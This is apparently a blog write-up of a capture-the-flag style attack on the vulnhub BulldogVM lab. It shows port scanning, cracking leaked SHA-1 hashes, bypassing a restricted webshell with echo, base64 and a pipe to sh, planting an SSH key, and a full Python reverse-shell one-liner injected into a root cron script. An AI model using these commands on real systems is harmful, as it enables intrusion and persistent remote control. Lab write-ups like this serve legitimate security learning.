---
title: 'Pentest: owning BulldogVM'
categories:
  - Penetration-Testing
tags:
  - Pentest
  - ctf
  - exploits

toc: true

---
After owning the Rick and Morty VM I searched vulnhub for another challenge, and I found a VM that hosted a bulldog lover website that got hacked.
The VM is available [here](https://www.vulnhub.com/entry/bulldog-1,211/) for your exploitation fun!
There is no capture the flag, the only goal is get root.

## Finding the open ports

I always start with a port scan on the target to find out all open ports and potential services running on those ports, this gives me a clear better picture of the VM and will tell me more information on how to approach the exploitation process.

`nmap 10.0.2.20 -p-`

this produced following results:

```
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy

```

----

## Telnet?

I see telnet open, which is not secure at all, you could just set up a listener and wait for a user to connect, and see the password in plain text and it's basically game over. However this is a VM, and no one is going to log on to it except us :D so this won't work.

when I connect to the telnet port using
`nc -v #(verbose option) 10.0.2.20 23`

I get a protcol mismatch, SSH seems to be running instead of telnet, interesting...

---

## 80 - 8080

I open my webbrowser and go to the website on port 80 and check port 8080 as well, they look the same...

time to use `dirb` to see any hidden folders (another spider can also be used ofcourse, but I start to like dirb)
`dirb http://10.0.2.20`

dirb found a /dev/ subdirectory, so I went to check it out in my browser and indeed there is another webpage there with a link to a webshell... interesting!

Clicking the webshell link will tell you you'll have to be authenticated...

----

On the /dev/ webpage there are some emails so we already have some potential usernames
taking a look at the source code of this page we see commented hashes
let's use a hash identifier to find out what hash this is and if it's crackable

`hash-identifier`
enter one of  the hashes found and it will tell you that there is a good chance the hash is SHA-1
put all the hashes in a file like this `user:hash`, and feed it to our trusty friend John-The-Ripper to decrypt

`john hashes --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt #location to wordlist`

after some time we get some interesting results:
```
bulldog         nick
bulldoglover    sarah
```

We found the password of nick and sarah, time to see what our friend `dirb` uncovered other than the /dev/ folder...
dirb found an admin folder with a login page, let's use nicks credentials and login
---

I've been able to login as nick, but nick has no permission to do anything on the page, Let's check if we can use the webshell we found before..

Yes, the web shell is now accessable, but it's "protected" we can only execute limited commands, or so the dev thinks,...

Indeed we can not use any commands other than the ones specified in a traditional way

but we can use the echo command, so what happens if we try to echo a "restricted" command and pipe it to the shell using `|sh`

it works, however we can't chain commands using `;`  so we have to do it all one by one, this is a tedious process ...
what happens however, if we encode our input to `base64` and decrypt it again, would that work?

yes, yes it does :) we can now chain commands.


## Create SSH access
----
since I can now chain commands I can now inject my own ssh key into the machine to have ssh access on my machine instead of that annoying webshell..

```
mkdir /home/django/.ssh #there was no ssh folder present yet
<my own ssh key> > /home/django/.ssh/authorized_keys
```

let's check out the `etc/passwd` file for all users, we can make it easier for ourselves and use `|grep bash` to see all users capable of using bash.
we find that there are 3 users on the system capable of doing this

```
root
bulldogadmin
django
```

After fiddling I found some hidden folders but not much good stuff going on, until I found a hidden directory in the `/etc/cron.d`  called hiddenAVDirectory
---

## I AM ROOT 

the root user runs a python script there, so all I did was inject a python shell in that script and opened a listener  on my kali

shell script:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<mykaliip>",44444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

kali listener:

`nc -lvp 44444`

and voila, root shell achieved.
